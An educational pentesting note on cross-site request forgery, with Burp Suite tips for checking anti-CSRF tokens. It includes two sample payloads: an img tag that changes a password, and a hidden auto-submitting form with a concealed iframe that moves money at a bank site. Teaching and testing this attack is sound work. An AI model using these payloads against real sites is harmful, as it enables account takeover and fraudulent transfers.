# Cross-site request forgery

Cross-site request forgery \(CSRF\) is a fairly common attack, usually involving malicious social engineering:

1. A user logs into an application \(e.g. a banking site\)
2. An attacker sends this user an email with a specially crafted URL, a hidden form, or an image with a malicious `src`
3. When loaded, the malicious payload makes a request to the application that the user is already logged into and changes the application state, leveraging the active session in the browser for authorization

An example of this exploit in action is a user's email address being changed so that an attacker can use an application's email-based password reset feature to grant themselves access.

## CSRF payloads

If the application's state can be changed using GET requests, the malicious payload could be embedded in an `img` tag:

```text
<img src="http://[host]/change-password.php?newPassword=hackerpassword">
```

CSRF payloads can also be delivered using POST requests, since a lot of state changes \(e.g. account updates\) happen by  automatically submitting a hidden web form when the user loads it:

```text
<html>
  <head>
    <title>Malicious web form</title>
  </head>
  <body onload="document.evil_bank_form.submit()">
    <form action="http://bank.com/transfer" method="POST" name="evil_bank_form" style="display: none;" target="hidden_results">
      <input type="text" name="amount" value="5000" />
      <input type="text" name="to_account" value="12345" />
    </form>
     <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```

This form also has a `target` which displays the results in a hidden `iframe` so that the user does not notice the malicious request.

For testing purposes, [Burp Suite can automatically generate a proof-of-concept CSRF payload](https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc), but you have to verify that there isn't a unique token in the test payload \(usually a form element with a random string\). There are a few ways to do this:

1. Run the payload twice to see if the server rejects it for being a duplicate or expired request
2. Clear your cache, log in again and see if the payload still works
3. Remove or alter anything that looks like a token from the form elements or GET parameters and see if the payload still works

Generally speaking, if one of the above actions throws an error, the application has some anti-CSRF protections which limit exploitation. 

## Further reading

* [What is cross-site request forgery?](https://www.acunetix.com/blog/articles/cross-site-request-forgery/) 
* [CodePath: cross-site request forgery](https://guides.codepath.com/websecurity/Cross-Site-Request-Forgery)
* [Using Burp to test for CSRF](https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-)

